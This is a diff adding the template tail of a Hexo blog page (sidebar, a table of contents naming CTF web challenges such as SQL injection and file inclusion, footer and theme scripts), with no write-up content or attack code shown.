+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、第38题（这是一个神奇的登陆框）"><span class="nav-number">1.</span> <span class="nav-text">一、第38题（这是一个神奇的登陆框）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、第39题（多次）"><span class="nav-number">2.</span> <span class="nav-text">二、第39题（多次）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、第40题（PHP-encrypt-1）"><span class="nav-number">3.</span> <span class="nav-text">三、第40题（PHP_encrypt_1）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、第41题（文件包含2）"><span class="nav-number">4.</span> <span class="nav-text">四、第41题（文件包含2）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、第42题（文件包含2）"><span class="nav-number">5.</span> <span class="nav-text">四、第42题（文件包含2）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、第43题（sql2）"><span class="nav-number">6.</span> <span class="nav-text">五、第43题（sql2）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、第45题（Trim的日记本）"><span class="nav-number">7.</span> <span class="nav-text">六、第45题（Trim的日记本）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、第46题（login2）"><span class="nav-number">8.</span> <span class="nav-text">七、第46题（login2）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#八、第47题（login3）"><span class="nav-number">9.</span> <span class="nav-text">八、第47题（login3）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#九、第48题（login4）"><span class="nav-number">10.</span> <span class="nav-text">九、第48题（login4）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十、文件上传2（湘桥杯）"><span class="nav-number">11.</span> <span class="nav-text">十、文件上传2（湘桥杯）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十一、秋名山老司机"><span class="nav-number">12.</span> <span class="nav-text">十一、秋名山老司机</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wr</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.0.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.0"></script>
+
+  <script src="/js/src/motion.js?v=7.0.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.0"></script>
+<script src="/js/src/post-details.js?v=7.0.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=7.0.0"></script>
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function(i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap');
+      $(e).after($wrap);
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+          return $(e).text();
+        }).toArray().join('\n');
+        var ta = document.createElement('textarea');
+        var range = document.createRange(); //For Chrome
+        var sel = window.getSelection(); //For Chrome
+        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.position = 'absolute';
+        ta.style.opacity = '0';
+        ta.value = code;
+        ta.textContent = code; //For FireFox
+        ta.contentEditable = true;
+        ta.readOnly = false;
+        document.body.appendChild(ta);
+        range.selectNode(ta);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        ta.setSelectionRange(0, code.length);
+        var result = document.execCommand('copy');
+        
+          if (result) $(this).text('复制成功');
+          else $(this).text('复制失败');
+        
+        ta.blur(); //For iOS
+        $(this).blur();
+      })).on('mouseleave', function(e) {
+        var $b = $(this).find('.copy-btn');
+        setTimeout(function() {
+          $b.text('复制');
+        }, 300);
+      }).append(e);
+    })
+  </script>
+
+
+  
+
+</body>
+</html>
